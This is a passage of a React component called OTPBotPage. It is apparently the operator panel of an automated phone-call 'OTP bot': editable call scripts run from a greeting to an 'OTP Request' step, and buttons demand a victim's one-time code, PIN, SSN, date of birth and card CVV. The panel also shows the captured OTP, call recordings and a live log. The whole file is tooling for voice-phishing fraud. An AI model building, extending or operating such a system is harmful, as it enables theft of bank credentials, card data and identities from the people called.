                                    <TabsTrigger value="rejected" className="text-xs data-[state=active]:bg-red-600">Rejected</TabsTrigger>
                                </TabsList>

                                <TabsContent value="step1" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 1 - Greeting & Initial Verification</p>
                                    <Textarea
                                        value={config.step1_message}
                                        onChange={(e) => setConfig({...config, step1_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[80px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="step2" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 2 - OTP Request</p>
                                    <Textarea
                                        value={config.step2_message}
                                        onChange={(e) => setConfig({...config, step2_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[80px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="step3" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 3 - Verification Wait</p>
                                    <Textarea
                                        value={config.step3_message}
                                        onChange={(e) => setConfig({...config, step3_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[80px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="accepted" className="space-y-2">
                                    <p className="text-xs text-emerald-400">Accepted Message</p>
                                    <Textarea
                                        value={config.accepted_message}
                                        onChange={(e) => setConfig({...config, accepted_message: e.target.value})}
                                        className="bg-[#0F111A] border-emerald-500/30 min-h-[80px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="rejected" className="space-y-2">
                                    <p className="text-xs text-red-400">Rejected Message</p>
                                    <Textarea
                                        value={config.rejected_message}
                                        onChange={(e) => setConfig({...config, rejected_message: e.target.value})}
                                        className="bg-[#0F111A] border-red-500/30 min-h-[80px] text-sm"
                                    />
                                </TabsContent>
                            </Tabs>
                        </CardContent>
                    </Card>
                </div>

                {/* Right Column - Current Call Status & Logs */}
                <div className="space-y-6">
                    {/* Current Call Status Card */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-2">
                            <div className="flex items-center justify-between">
                                <CardTitle className="text-lg flex items-center gap-2">
                                    <TrendingUp className="w-5 h-5 text-emerald-400" />
                                    Current Call Status
                                </CardTitle>
                                {isCallActive && (
                                    <div className="flex gap-2 flex-wrap">
                                        <Button
                                            onClick={handleAccept}
                                            disabled={isLoading || !otpReceived}
                                            size="sm"
                                            className="bg-emerald-600 hover:bg-emerald-700"
                                        >
                                            <CheckCircle2 className="w-3 h-3 mr-1" />
                                            Accept OTP
                                        </Button>
                                        <Button
                                            onClick={handleReject}
                                            disabled={isLoading || !otpReceived}
                                            size="sm"
                                            variant="destructive"
                                        >
                                            <XCircle className="w-3 h-3 mr-1" />
                                            Deny OTP
                                        </Button>
                                        <Button
                                            onClick={() => handleRequestPin(4)}
                                            disabled={isLoading}
                                            size="sm"
                                            className="bg-amber-600 hover:bg-amber-700"
                                        >
                                            <Key className="w-3 h-3 mr-1" />
                                            PIN 4
                                        </Button>
                                        <Button
                                            onClick={() => handleRequestPin(6)}
                                            disabled={isLoading}
                                            size="sm"
                                            className="bg-amber-600 hover:bg-amber-700"
                                        >
                                            <Key className="w-3 h-3 mr-1" />
                                            PIN 6
                                        </Button>
                                        <Button
                                            onClick={() => handleRequestInfo('otp_email')}
                                            disabled={isLoading}
                                            size="sm"
                                            className="bg-violet-600 hover:bg-violet-700"
                                        >
                                            <Mail className="w-3 h-3 mr-1" />
                                            OTP Email
                                        </Button>
                                        <Button
                                            onClick={() => handleRequestInfo('ssn')}
                                            disabled={isLoading}
                                            size="sm"
                                            className="bg-blue-600 hover:bg-blue-700"
                                        >
                                            <Hash className="w-3 h-3 mr-1" />
                                            SSN
                                        </Button>
                                        <Button
                                            onClick={() => handleRequestInfo('dob')}
                                            disabled={isLoading}
                                            size="sm"
                                            className="bg-cyan-600 hover:bg-cyan-700"
                                        >
                                            <User className="w-3 h-3 mr-1" />
                                            DOB
                                        </Button>
                                        <Button
                                            onClick={() => handleRequestInfo('cvv')}
                                            disabled={isLoading}
                                            size="sm"
                                            className="bg-pink-600 hover:bg-pink-700"
                                        >
                                            <Shield className="w-3 h-3 mr-1" />
                                            CVV
                                        </Button>
                                    </div>
                                )}
                            </div>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            {!isCallActive && !sessionId ? (
                                <div className="text-center py-8 text-gray-500">
                                    <PhoneCall className="w-12 h-12 mx-auto opacity-30 mb-3" />
                                    <p>No active call</p>
                                    <p className="text-sm">Start a call to begin</p>
                                </div>
                            ) : (
                                <div className="space-y-3">
                                    <div className="grid grid-cols-2 gap-4">
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">Call ID</p>
                                            <p className="font-mono text-sm text-gray-300 truncate">
                                                {callId || '-'}
                                            </p>
                                        </div>
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">Status</p>
                                            {getStatusBadge()}
                                        </div>
                                    </div>

                                    <div className="grid grid-cols-2 gap-4">
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">Captured OTP</p>
                                            <p className="font-mono text-2xl font-bold text-amber-400">
                                                {otpReceived || '-'}
                                            </p>
                                        </div>
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">Duration</p>
                                            <p className="font-mono text-lg text-gray-300 flex items-center gap-2">
                                                <Clock className="w-4 h-4" />
                                                {formatDuration(callDuration)}
                                            </p>
                                        </div>
                                    </div>

                                    <div className="grid grid-cols-2 gap-4">
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">AMD Result</p>
                                            <Badge className={`${
                                                amdResult === 'HUMAN' ? 'bg-emerald-500/20 text-emerald-400' :
                                                amdResult === 'VOICEMAIL' ? 'bg-purple-500/20 text-purple-400' :
                                                'bg-gray-500/20 text-gray-400'
                                            }`}>
                                                {amdResult || 'Detecting...'}
                                            </Badge>
                                        </div>
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">Recording</p>
                                            {recordingUrl ? (
                                                <div className="flex items-center gap-2">
                                                    <Button 
                                                        size="sm" 
                                                        variant="outline"
                                                        onClick={async () => {
                                                            try {
                                                                const token = localStorage.getItem('token');
                                                                const response = await fetch(recordingUrl, {
                                                                    headers: { Authorization: `Bearer ${token}` }
                                                                });
                                                                const blob = await response.blob();
                                                                const url = URL.createObjectURL(blob);
                                                                
                                                                if (audioRef.current) {
                                                                    audioRef.current.src = url;
                                                                    if (isPlaying) {
                                                                        audioRef.current.pause();
                                                                        setIsPlaying(false);
                                                                    } else {
                                                                        audioRef.current.play();
                                                                        setIsPlaying(true);
                                                                    }
                                                                }
                                                            } catch (error) {
                                                                console.error('Error playing recording:', error);
                                                                toast.error('Failed to play recording');
                                                            }
                                                        }}
                                                        className="text-pink-400 border-pink-500/30"
                                                    >
                                                        {isPlaying ? <Pause className="w-3 h-3 mr-1" /> : <Play className="w-3 h-3 mr-1" />}
                                                        {isPlaying ? 'Pause' : 'Play'}
                                                    </Button>
                                                    <Button 
                                                        size="sm" 
                                                        variant="outline"
                                                        onClick={async () => {
                                                            try {
                                                                const token = localStorage.getItem('token');
                                                                const response = await fetch(recordingUrl, {
                                                                    headers: { Authorization: `Bearer ${token}` }
                                                                });
                                                                const blob = await response.blob();
                                                                const url = URL.createObjectURL(blob);
                                                                const a = document.createElement('a');
                                                                a.href = url;
                                                                a.download = `recording_${callId}.wav`;
                                                                a.click();
                                                            } catch (error) {
                                                                console.error('Error downloading recording:', error);
                                                                toast.error('Failed to download recording');
                                                            }
                                                        }}
                                                        className="text-cyan-400 border-cyan-500/30"
                                                    >
                                                        <Download className="w-3 h-3 mr-1" />
                                                        Download
                                                    </Button>
                                                    <audio ref={audioRef} onEnded={() => setIsPlaying(false)} />
                                                </div>
                                            ) : (
                                                <p className="text-sm text-gray-500">Not available</p>
                                            )}
                                        </div>
                                    </div>

                                    {isCallActive && (
                                        <div className="pt-2">
                                            <Button
                                                onClick={handleHangup}
                                                disabled={isLoading}
                                                variant="destructive"
                                                className="w-full"
                                            >
                                                <PhoneOff className="w-4 h-4 mr-2" />
                                                End Call
                                            </Button>
                                        </div>
                                    )}
                                </div>
                            )}
                        </CardContent>
                    </Card>

                    {/* Live Call Log */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-2 flex flex-row items-center justify-between">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Terminal className="w-5 h-5 text-emerald-400" />
                                Live Call Log
                            </CardTitle>
                            <div className="flex gap-2">
                                <Button variant="outline" size="sm" onClick={copyLogs} className="text-gray-400 hover:text-white border-white/10">
                                    <Copy className="w-4 h-4 mr-1" />
                                    Copy
                                </Button>
                                <Button variant="outline" size="sm" onClick={exportLogs} className="text-gray-400 hover:text-white border-white/10">
                                    <Download className="w-4 h-4 mr-1" />
                                    Export
                                </Button>
                            </div>
                        </CardHeader>
                        <CardContent>
                            <ScrollArea className="h-[350px] pr-4">
                                <div className="space-y-2 font-mono text-sm">
                                    {logs.length === 0 ? (
                                        <p className="text-gray-500 text-center py-8">Waiting for call activity...</p>
                                    ) : (
                                        logs.map((log, index) => (
                                            <div 
                                                key={index} 
                                                className={`flex gap-2 ${getLogColor(log.type)}`}
                                            >
                                                <span className="text-gray-500">[{log.timestamp}]</span>
                                                <span>{getLogIcon(log.type)}</span>
                                                <span>{log.message}</span>
                                            </div>
                                        ))
                                    )}
                                    <div ref={logsEndRef} />
                                </div>
                            </ScrollArea>
                            {sessionId && (
                                <p className="text-xs text-gray-500 mt-4 font-mono">
                                    Session: {sessionId.substring(0, 8)}...
                                </p>
                            )}
                        </CardContent>
                    </Card>
                </div>
            </div>
        </div>
    );
};

export default OTPBotPage;
